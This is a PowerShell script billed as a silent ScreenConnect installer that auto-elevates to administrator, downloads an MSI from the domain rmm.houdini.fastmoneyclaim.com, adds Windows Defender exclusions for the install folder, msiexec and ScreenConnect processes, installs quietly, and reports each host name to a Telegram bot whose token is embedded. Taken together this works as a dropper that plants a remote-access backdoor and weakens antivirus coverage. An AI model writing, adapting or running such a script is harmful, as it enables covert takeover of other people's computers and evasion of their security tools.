<#
.SYNOPSIS
    Silent ScreenConnect MSI installer with auto-elevation and Telegram reporting.
.DESCRIPTION
    Downloads and installs ScreenConnect MSI from your RMM server silently.
    Auto-elevates to admin, sends Telegram notifications, and cleans up after installation.
#>

$ErrorActionPreference = "Stop"

#region [CONFIGURATION]
$url = "https://rmm.houdini.fastmoneyclaim.com/dashboard/api/static/screenconnect.msi"
$fileName = "screenconnect.msi"
$tempFile = "$env:TEMP\$fileName"
$installDir = "$env:ProgramFiles\ScreenConnect"

$telegramToken = "8943239657:AAHGsy-FxQyupMDkAXxfLpSHQfCu0BDinlo"
$telegramChat = "-1004304329446"
$telegramProduct = "ScreenConnect"
#endregion

#region [AUTO-ELEVATE]
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Not running as administrator - relaunching with elevated privileges..." -ForegroundColor Yellow
    $scriptPath = $MyInvocation.MyCommand.Path
    if (-not $scriptPath) { $scriptPath = $MyInvocation.ScriptName }
    if ($scriptPath) {
        Start-Process powershell.exe -Verb RunAs -WindowStyle Minimized -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    }
    exit 0
}
#endregion

#region [TELEGRAM FUNCTION]
function Send-Telegram {
    param(
        [string]$Event,
        [string]$Status = "",
        [hashtable]$Fields = @{}
    )
    if (-not $telegramToken -or -not $telegramChat) { return }
    $titles = @{
        install_start = 'Install Started'
        install_ok = 'Install Succeeded'
        install_fail = 'Install Failed'
        uninstall = 'Uninstalled'
        start = 'Started'
        stop = 'Stopped'
        online = 'Online'
        offline = 'Offline'
        test = 'Test'
    }
    $icons = @{
        install_start = '[START]'
        install_ok = '[OK]'
        install_fail = '[FAIL]'
        uninstall = '[UNINSTALL]'
        start = '[START]'
        stop = '[STOP]'
        online = '[ONLINE]'
        offline = '[OFFLINE]'
        test = '[TEST]'
    }
    $icon = $icons[$Event]
    if (-not $icon) { $icon = '[INFO]' }
    $title = $titles[$Event]
    if (-not $title) { $title = $Event }
    $line = "------------------------"
    $msg = "$icon $telegramProduct - $title`r`n$line`r`n"
    foreach ($k in $Fields.Keys) {
        $v = [string]$Fields[$k]
        if ($v) { $msg += "* $k : $v`r`n" }
    }
    $msg += "$line`r`n"
    if ($Status) {
        $emoji = '[OK]'
        if ($Status -match 'fail|error') { $emoji = '[FAIL]' }
        $msg += "$emoji Status : $Status`r`n"
    }
    $msg += "[TIME] $([DateTime]::UtcNow.ToString('yyyy-MM-dd HH:mm:ss')) UTC"
    try {
        $body = @{ chat_id = $telegramChat; text = $msg; parse_mode = '' }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramToken/sendMessage" -Method Post -Body $body -ContentType 'application/x-www-form-urlencoded' | Out-Null
    } catch {
        Write-Host "  [TG] send failed: $($_.Exception.Message)" -ForegroundColor DarkGray
    }
}
#endregion

#region [MAIN]
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  ScreenConnect Silent Installer" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "Server : rmm.houdini.fastmoneyclaim.com" -ForegroundColor Gray
Write-Host ""

Send-Telegram -Event 'install_start' -Status "Starting installation" -Fields @{ 'Host' = $env:COMPUTERNAME }

# ---- Step 1: Download ----
Write-Host "[1] Downloading ScreenConnect MSI..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $tempFile -ErrorAction Stop
    Write-Host "  [OK] Downloaded to: $tempFile" -ForegroundColor Gray
} catch {
    Write-Host "  [ERROR] Download failed: $_" -ForegroundColor Red
    Send-Telegram -Event 'install_fail' -Status "Download failed" -Fields @{ 'Host' = $env:COMPUTERNAME; 'Error' = $_.Exception.Message }
    exit 1
}

# ---- Step 2: Add Defender exclusion ----
Write-Host "[2] Adding Windows Defender exclusions..." -ForegroundColor Cyan
try {
    Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "msiexec.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "ScreenConnect*" -ErrorAction SilentlyContinue
    Write-Host "  [OK] Exclusions added for: $installDir" -ForegroundColor Gray
} catch {
    Write-Host "  [WARN] Could not add Defender exclusions: $_" -ForegroundColor Yellow
}

# ---- Step 3: Install MSI silently ----
Write-Host "[3] Installing ScreenConnect MSI..." -ForegroundColor Cyan
try {
    $installArgs = @("/i", """$tempFile""", "/quiet", "/norestart", "ALLUSERS=1", "MSIINSTALLPERUSER=")
    Write-Host "  Running: msiexec $($installArgs -join ' ')" -ForegroundColor Gray
    $process = Start-Process "msiexec.exe" -ArgumentList $installArgs -Wait -PassThru -NoNewWindow
    $exitCode = $process.ExitCode
    if ($exitCode -eq 0 -or $exitCode -eq 3010) {
        Write-Host "  [OK] Installation completed (exit code: $exitCode)" -ForegroundColor Green
        Send-Telegram -Event 'install_ok' -Status "Installation succeeded" -Fields @{ 'Host' = $env:COMPUTERNAME; 'ExitCode' = $exitCode }
    } else {
        Write-Host "  [WARN] Standard MSI install returned exit code: $exitCode" -ForegroundColor Yellow
        Write-Host "  Trying alternative: /quiet /qn..." -ForegroundColor Gray
        $altArgs = @("/i", """$tempFile""", "/quiet", "/qn", "ALLUSERS=1")
        $process2 = Start-Process "msiexec.exe" -ArgumentList $altArgs -Wait -PassThru -NoNewWindow
        $exitCode2 = $process2.ExitCode
        if ($exitCode2 -eq 0 -or $exitCode2 -eq 3010) {
            Write-Host "  [OK] Installation succeeded with alternative switches (exit code: $exitCode2)" -ForegroundColor Green
            Send-Telegram -Event 'install_ok' -Status "Installation succeeded" -Fields @{ 'Host' = $env:COMPUTERNAME; 'ExitCode' = $exitCode2 }
        } else {
            Write-Host "  [ERROR] Installation failed with all methods. Exit code: $exitCode2" -ForegroundColor Red
            Send-Telegram -Event 'install_fail' -Status "Installation failed" -Fields @{ 'Host' = $env:COMPUTERNAME; 'ExitCode' = $exitCode2 }
            exit 1
        }
    }
} catch {
    Write-Host "  [ERROR] Installation failed: $_" -ForegroundColor Red
    Send-Telegram -Event 'install_fail' -Status "Installation failed" -Fields @{ 'Host' = $env:COMPUTERNAME; 'Error' = $_.Exception.Message }
    exit 1
}

# ---- Step 4: Verification ----
Write-Host "[4] Verification..." -ForegroundColor Cyan
Start-Sleep -Seconds 5

$processNames = @("ScreenConnect", "ScreenConnect Client", "ScreenConnect.Client", "ScreenConnect.ClientSetup")
$foundProcess = $null
foreach ($name in $processNames) {
    $foundProcess = Get-Process -Name $name -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($foundProcess) { break }
}

if ($foundProcess) {
    Write-Host "  [OK] ScreenConnect is running (PID: $($foundProcess.Id))" -ForegroundColor Green
    Send-Telegram -Event 'online' -Status "ScreenConnect running" -Fields @{ 'Host' = $env:COMPUTERNAME; 'PID' = $foundProcess.Id }
} else {
    Write-Host "  [WARN] ScreenConnect process not found - check manually" -ForegroundColor Yellow
    Send-Telegram -Event 'install_ok' -Status "Installed (process check pending)" -Fields @{ 'Host' = $env:COMPUTERNAME }
}

# ---- Step 5: Cleanup ----
Write-Host "[5] Cleanup..." -ForegroundColor Cyan
if (Test-Path $tempFile) {
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
    Write-Host "  [OK] Removed temporary file" -ForegroundColor Gray
}

# ---- Summary ----
Write-Host ""
Write-Host "============================================" -ForegroundColor Magenta
Write-Host "  INSTALLATION COMPLETE" -ForegroundColor Green
Write-Host "  Server : rmm.houdini.fastmoneyclaim.com" -ForegroundColor Gray
Write-Host "  Installer: $fileName" -ForegroundColor Gray
Write-Host "  Location: $installDir" -ForegroundColor Gray
Write-Host "============================================" -ForegroundColor Magenta

Send-Telegram -Event 'install_ok' -Status "Installation complete" -Fields @{ 'Host' = $env:COMPUTERNAME }
#endregion